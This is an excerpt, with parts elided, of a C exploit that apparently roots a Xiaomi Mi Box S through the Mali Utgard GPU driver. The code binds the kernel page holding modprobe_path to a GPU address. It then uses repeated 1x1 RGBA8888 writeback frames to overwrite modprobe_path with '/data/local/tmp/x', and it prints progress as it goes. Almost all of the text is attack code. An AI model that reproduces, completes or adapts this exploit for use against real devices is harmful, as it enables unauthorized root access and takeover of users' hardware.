/*
 * kort_miboxs_1x1.c - Mi Box S root via Mali Utgard (1x1 frame strategy)
 *
 * Strategy:
 * - BIND modprobe_path physical page to GPU
 * - Use 1x1 RGBA8888 frames to write 4 bytes at a time
 * - Each write covers ~184 bytes (well within 256-byte modprobe_path buffer)
 * - Write string "/data/local/tmp/x" into modprobe_path via multiple writes
 */
...
/*
 * wb_write_rgba: Write 4 bytes (R,G,B,A) at given GPU VA target offset.
 * Uses 1x1 RGBA8888 frame.
 * Actual write size ~184 bytes (repeating RGBA pattern).
...
static int wb_write_rgba(uint32_t tgt_offset, uint8_t vr, uint8_t vg, uint8_t vb, uint8_t va)
{
    ...
    job.wb0_registers[WB_PITCH]        = 1;     /* pitch = 1 * 8 = 8 bytes/row (min) */
...
/*
 * Write a string to target offset using multiple 1x1 RGBA writes.
 * Each write sets 4 bytes (R,G,B,A) at offset, offset+1, offset+2, offset+3.
 * Actual write covers ~184 bytes (repeating pattern), but since we write
 * sequentially from low to high offset, each 4-byte group is correctly set.
 */
static int wb_write_string(uint32_t tgt_base_offset, const char *str, int len)
{
    int offset = 0;
    while (offset < len) {
        ...
        printf("  [off %3d] write 0x%02x 0x%02x 0x%02x 0x%02x",
               offset, vr, vg, vb, va);

        int rc = wb_write_rgba(tgt_base_offset + offset, vr, vg, vb, va);
        if (rc != 0) {
            printf(" FAILED\n");
            return rc;
        }
...
int main(int argc, char **argv)
{
    ...
    /* ALLOC_MEM for job data (PLB, shader, RSW, stack) */
    ...
    printf("[1] BIND modprobe page 0x%08x -> GPU VA 0x%08x\n",
    ...
    /* Write path string into modprobe_path */
    printf("[2] write payload \"%s\" into modprobe_path\n", path);
    printf("  [*] writing %d bytes (as %d u32) to modprobe_path phys 0x%08x+0x%x\n",
           (int)strlen(path) + 1,
           (int)((strlen(path) + 1 + 3) / 4),
           MODPROBE_PATH_PAGE, MODPROBE_PATH_INPAGE);

    int rc = wb_write_string(MODPROBE_PATH_INPAGE, path, strlen(path) + 1);
    if (rc != 0) {
        printf("[-] WRITE FAILED\n");
        return 1;
    }
    printf("[+] WRITE OK - modprobe_path should now be \"%s\"\n", path);
